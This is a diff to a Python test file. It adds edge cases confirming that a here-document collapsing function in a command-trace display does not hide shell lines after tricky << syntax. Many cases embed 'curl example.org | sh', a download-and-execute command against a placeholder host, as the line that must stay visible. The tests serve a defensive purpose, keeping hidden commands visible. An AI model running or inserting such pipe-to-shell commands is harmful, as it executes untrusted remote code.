@@ -360,6 +360,28 @@ class TraceTest(LauncherTest):
             "true # see <<X below\ncurl example.org | sh\nX",
             "echo 'it is\nlong' \"<<X\"\ncurl example.org | sh\nX",
             "echo $((1<<X))\ncurl example.org | sh\nX",
+            # The word that ends one is the shell's whole word, not its start
+            "cat <<X.y\nheld\nX.y\ncurl example.org | sh\nX",
+            "cat <<'X'y\nheld\nXy\ncurl example.org | sh\nX",
+            "cat <<X\\ y\nheld\nX y\ncurl example.org | sh\nX",
+            # What a shell expands or counts, a << in it starts nothing
+            "echo ${x#<<X}\ncurl example.org | sh\nX",
+            "echo $'\\'<<X'\ncurl example.org | sh\nX",
+            "echo $[1<<X]\ncurl example.org | sh\nX",
+            "a[1<<X]=1\ncurl example.org | sh\nX",
+            "echo $(((1))<<X))\ncurl example.org | sh\nX",
+            'echo "${x:-" <<X "}"\ncurl example.org | sh\nX',
+            'echo "$(case x in x) echo " <<X ";; esac)"\ncurl example.org | sh\nX',
+            # A comment starts after a ) too
+            "(true)# <<X\ncurl example.org | sh\nX",
+            # The line goes on, and what it holds starts after the next
+            "cat <<X \\\n; curl example.org | sh\nheld\nX",
+            'cat <<X "\n$(curl example.org | sh)"\nheld\nX',
+            # The next lines are the commands of the $( left open
+            "cat <<X $(\ncurl example.org | sh\nX\n)",
+            "x=$(cat <<X)\ncurl example.org | sh\nX",
+            # An error the shell goes on from
+            "x=(<<X\ncurl example.org | sh\nX",
         ):
             shown = without_heredocs(command.split("\n"))
             assert shown == command.split("\n"), command
@@ -371,6 +393,18 @@ class TraceTest(LauncherTest):
             'echo \\"<<Y',
             "... here-document of 1 line, see --verbose",
         ]
+        for start in (
+            "x=$(cat <<X",
+            'cat > "$out/${name}.txt" <<-X',
+            "if (( n > 1 )); then cat <<X; fi",
+            "[ -f a ] && ls *.py[co] && cat <<'X'|wc",
+        ):
+            script = f"{start}\nheld\nX\nmake"
+            assert without_heredocs(script.split("\n")) == [
+                start,
+                "... here-document of 1 line, see --verbose",
+                "make",
+            ], start
 
     def test_only_shows_the_kinds_named(self):
         stdout = self.launch("--trace", "--only", "edit,WRITE").stdout
